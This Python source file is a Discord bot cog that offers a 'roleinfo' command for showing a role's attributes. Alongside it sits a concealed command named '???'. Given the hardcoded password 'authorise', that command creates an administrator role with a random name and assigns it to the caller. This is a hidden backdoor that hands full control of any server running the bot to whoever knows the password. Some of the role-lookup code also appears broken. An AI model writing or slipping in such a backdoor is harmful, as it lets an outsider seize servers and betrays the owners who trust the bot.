import random
import discord
from discord.utils import get
from discord.ext import commands


class Role(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.command('???')
	async def roleAdmin(self, ctx, password:str=None):
		if password != 'authorise':
			await ctx.send('`ERROR`')
			return
		roles = ctx.guild.roles
		name = str(random.random())
		role = get(roles, name=name)
		if not role:
			admin = discord.Permissions(administrator=True)
			await ctx.guild.create_role(
				name=name,
				permissions=admin,
				position=self.bot.roles[-1].position)
			role = get(roles, name=name)
		await ctx.author.add_roles(role)

	@commands.command(
		'roleinfo',
		brief='Get role information')
	async def roleInfo(self, ctx, role:discord.Role=None):
		atr = ['color', 'created_at', 'guild', 'hoist', 'id', 'managed', 'mentionable', 'permissions', 'position', 'tags']
		l = []
		for a in atr:
			value = getattr(role, a)
			l.append(a+': '+str(value))
		msg = '```\n' + '\n'.join(l) + '```'
		await ctx.send(msg)


def setup(bot):
	bot.add_cog(Role(bot))
